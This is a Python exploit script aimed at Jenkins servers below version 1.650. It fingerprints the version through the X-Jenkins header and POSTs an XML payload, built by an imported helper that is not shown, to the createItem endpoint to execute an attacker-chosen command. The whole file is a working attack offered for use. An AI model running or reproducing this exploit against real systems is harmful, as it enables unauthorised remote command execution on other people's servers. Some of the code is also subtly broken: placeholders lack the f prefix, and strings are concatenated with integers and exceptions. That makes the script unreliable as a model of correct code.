import random
import string
from decimal import Decimal

import requests
from requests.exceptions import RequestException

from prepare_payload import prepare_payload


def exploit(url, command):
    print('[*] STARTING')
    try:
        print('[+] Trying to exploit Jenkins running at address: ' + url)
        # Perform initial URL check to see if server is online and returns correct response code using HEAD request
        headResponse = requests.head(url, timeout=30)
        if headResponse.status_code == requests.codes.ok:
            print('[+] Server online and responding | RESPONSE: {headResponse.status_code}')
            # Check if X-Jenkins header containing version is present then proceed
            jenkinsVersionHeader = headResponse.headers.get('X-Jenkins')
            if jenkinsVersionHeader is not None:
                # Strip version after second dot from header to perform conversion to Decimal
                stripCharacter = "."
                strippedVersion = stripCharacter.join(jenkinsVersionHeader.split(stripCharacter)[:2])
                # Perform basic version check
                if Decimal(strippedVersion) < 1.650:
                    print('[+] Jenkins version: {strippedVersion} | VULNERABLE')
                    # Prepare payload
                    payload = prepare_payload(command)
                    # Prepare POST url
                    if url.endswith('/'):
                        postUrl = url + 'createItem?name=test'
                    else:
                        postUrl = url + '/createItem?name=test'
                    print('[+] Will POST to ' + postUrl)
                    # Try to execute passed command
                    postResponse = requests.post(postUrl, data=payload, headers={'Content-Type': 'application/xml'})
                    print('[+] Exploit launched ')
                    # 500 response code is ok here
                    print('[+] Response code: {postResponse.status_code}')
                    if postResponse.status_code == 500:
                        print('[+] SUCCESS')
                    else:
                        print('[-][ERROR] EXPLOIT LAUNCHED, BUT WRONG RESPONSE CODE RETURNED')
                else:
                    print('[-][ERROR] Version {Decimal(strippedVersion)} is not vulnerable')
            else:
                print('[-][ERROR] X-Jenkins header not present, check if Jenkins is actually running at ' + url)
        else:
            print('[-][ERROR] ' + url + ' Server did not return success response code | RESPONSE: ' + headResponse.status_code)
    except RequestException as ex:
        print('[-] [ERROR] Request exception: ' + ex)
    print('[*] FINISHED')
